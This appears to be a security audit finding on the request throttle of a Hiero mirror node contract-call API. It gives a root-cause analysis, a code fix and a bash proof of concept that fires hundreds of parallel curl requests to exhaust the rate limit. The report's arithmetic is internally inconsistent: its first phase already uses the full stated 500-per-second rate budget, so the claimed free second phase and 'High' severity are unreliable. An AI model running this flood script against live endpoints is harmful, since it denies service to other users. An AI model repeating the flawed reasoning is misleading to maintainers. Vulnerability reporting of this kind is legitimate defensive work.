### Title
Rate-Limit Token Leaked on Gas-Bucket Rejection Enables Amplified DoS

### Summary
In `ThrottleManagerImpl.throttle()`, a `rateLimitBucket` token is consumed before `gasLimitBucket` is checked. When `gasLimitBucket.tryConsume()` returns `false`, a `ThrottleException` is thrown but the already-consumed `rateLimitBucket` token is never restored. An unprivileged attacker can exploit this to drain the shared `rateLimitBucket` without performing any EVM computation, denying service to all other users.

### Finding Description
**Exact code path:**

`ThrottleManagerImpl.java`, lines 37–42:
```java
if (!rateLimitBucket.tryConsume(1)) {
    throw new ThrottleException(REQUEST_PER_SECOND_LIMIT_EXCEEDED);
} else if (!gasLimitBucket.tryConsume(throttleProperties.scaleGas(request.getGas()))) {
    throw new ThrottleException(GAS_PER_SECOND_LIMIT_EXCEEDED);   // rateLimitBucket token already gone
}
```

**Root cause:** The two checks are sequential and non-atomic. `rateLimitBucket.tryConsume(1)` succeeds and permanently deducts 1 token. If the subsequent `gasLimitBucket.tryConsume()` fails, the code throws without restoring the rate-limit token. The `restore(long gas)` method (line 59–64) only adds tokens back to `gasLimitBucket`; there is no corresponding restore path for `rateLimitBucket`. The controller's catch block (`ContractController.java` line 47–49) only calls `throttleManager.restore()` on `InvalidParametersException`, not on `ThrottleException`.

**Exploit flow:**

*Phase 1 – deplete `gasLimitBucket`:*
Default `gasPerSecond = 7_500_000_000`; after `scaleGas` the bucket holds `750_000` tokens. Default `maxGasLimit` (EVM) is 15 000 000; `scaleGas(15_000_000) = 1_500` tokens per request. An attacker sends `⌈750_000 / 1_500⌉ = 500` requests with `gas = 15_000_000`. This consumes 500 `rateLimitBucket` tokens and fully drains `gasLimitBucket` within one second.

*Phase 2 – drain `rateLimitBucket` for free:*
With `gasLimitBucket` at 0, every subsequent request in the same second passes `rateLimitBucket.tryConsume(1)` (consuming 1 token) but immediately fails `gasLimitBucket.tryConsume()`. The rate-limit token is gone; no gas is consumed; no EVM work is done. The attacker repeats until `rateLimitBucket` is exhausted (default 500 tokens/s).

*Result:* Both buckets are empty. All legitimate users receive HTTP 429 for the remainder of the second. The attack repeats every second with zero EVM cost after Phase 1.

**Why existing checks are insufficient:**
- `rateLimitBucket` has no per-IP or per-identity partitioning; it is a single shared `Bucket` bean.
- `ThrottleProperties.scaleGas()` returns `0` for `gas ≤ 10_000`, meaning those requests never touch `gasLimitBucket` at all, but the rate-limit token is still consumed on the first check — a separate but related leak.
- There is no rollback/compensation path for `rateLimitBucket` anywhere in the codebase.

### Impact Explanation
The shared `rateLimitBucket` is the primary guard against request flooding. Draining it without EVM computation means the attacker pays no meaningful server cost while all legitimate callers are throttled. This is a complete, repeatable denial-of-service against the `/api/v1/contracts/call` endpoint for every second the attack runs. Severity: **High** (availability impact, no authentication required, trivially repeatable).

### Likelihood Explanation
Any anonymous HTTP client can trigger this. No credentials, contract knowledge, or on-chain state are required. The attacker only needs to know the approximate `gasPerSecond` / `requestsPerSecond` ratio (both are documented defaults). The attack is fully scriptable with a standard HTTP client sending POST requests with a large `gas` field. Repeatability is once per second indefinitely.

### Recommendation
Restore the `rateLimitBucket` token when `gasLimitBucket` fails:

```java
if (!rateLimitBucket.tryConsume(1)) {
    throw new ThrottleException(REQUEST_PER_SECOND_LIMIT_EXCEEDED);
}
if (!gasLimitBucket.tryConsume(throttleProperties.scaleGas(request.getGas()))) {
    rateLimitBucket.addTokens(1);   // compensate the already-consumed token
    throw new ThrottleException(GAS_PER_SECOND_LIMIT_EXCEEDED);
}
```

Alternatively, expose a `restoreRateLimit()` method on `ThrottleManager` and call it from the same catch block in `ContractController` that already handles `InvalidParametersException`. Also consider making the two-bucket check atomic (e.g., check availability with `getAvailableTokens()` before consuming either bucket, or use a single composite bucket).

### Proof of Concept
```bash
# Phase 1: deplete gasLimitBucket (500 requests, gas = 15_000_000)
for i in $(seq 1 500); do
  curl -s -o /dev/null -X POST http://<host>/api/v1/contracts/call \
    -H 'Content-Type: application/json' \
    -d '{"to":"0x0000000000000000000000000000000000000001","gas":15000000,"data":"0x"}' &
done
wait

# Phase 2: drain rateLimitBucket without gas consumption (gasLimitBucket is now 0)
for i in $(seq 1 500); do
  curl -s -o /dev/null -X POST http://<host>/api/v1/contracts/call \
    -H 'Content-Type: application/json' \
    -d '{"to":"0x0000000000000000000000000000000000000001","gas":15000000,"data":"0x"}' &
done
wait

# Legitimate user is now fully blocked for the remainder of the second:
curl -v -X POST http://<host>/api/v1/contracts/call \
  -H 'Content-Type: application/json' \
  -d '{"to":"0x0000000000000000000000000000000000000001","gas":21000,"data":"0x"}'
# Expected: HTTP 429 Too Many Requests — "Requests per second rate limit exceeded"
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

### Citations

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleManagerImpl.java (L37-42)
```java
    public void throttle(ContractCallRequest request) {
        if (!rateLimitBucket.tryConsume(1)) {
            throw new ThrottleException(REQUEST_PER_SECOND_LIMIT_EXCEEDED);
        } else if (!gasLimitBucket.tryConsume(throttleProperties.scaleGas(request.getGas()))) {
            throw new ThrottleException(GAS_PER_SECOND_LIMIT_EXCEEDED);
        }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleManagerImpl.java (L59-64)
```java
    public void restore(long gas) {
        long tokens = throttleProperties.scaleGas(gas);
        if (tokens > 0) {
            gasLimitBucket.addTokens(tokens);
        }
    }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/controller/ContractController.java (L46-49)
```java
        } catch (InvalidParametersException e) {
            // The validation failed, but no processing occurred so restore the consumed tokens.
            throttleManager.restore(request.getGas());
            throw e;
```

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleProperties.java (L42-47)
```java
    public long scaleGas(long gas) {
        if (gas <= GAS_SCALE_FACTOR) {
            return 0L;
        }
        return Math.floorDiv(gas, GAS_SCALE_FACTOR);
    }
```
